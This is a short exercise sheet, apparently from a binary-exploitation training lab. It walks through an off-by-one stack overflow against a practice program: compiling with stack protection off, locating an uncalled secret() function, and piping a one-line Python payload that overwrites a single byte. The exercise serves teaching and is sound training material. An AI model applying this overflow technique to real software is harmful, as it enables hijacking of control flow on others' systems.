Exercise 03 — Off-by-One
==========================

A loop uses <= instead of <.
It writes 17 bytes into a 16-byte buffer.
That single extra byte lands on the saved RBP.

The function secret() exists in the binary but is never called.

  Compile:
    gcc -fno-stack-protector -no-pie -o target target.c

  Find the address of secret():
    nm target | grep secret

  Send 16 bytes of padding + 1 byte (the LSB of secret's address):
    python3 -c "import sys; sys.stdout.buffer.write(b'A' * 16 + bytes([0xXX]))" | ./target

When you see [SUCCESS], run `horizon done`.
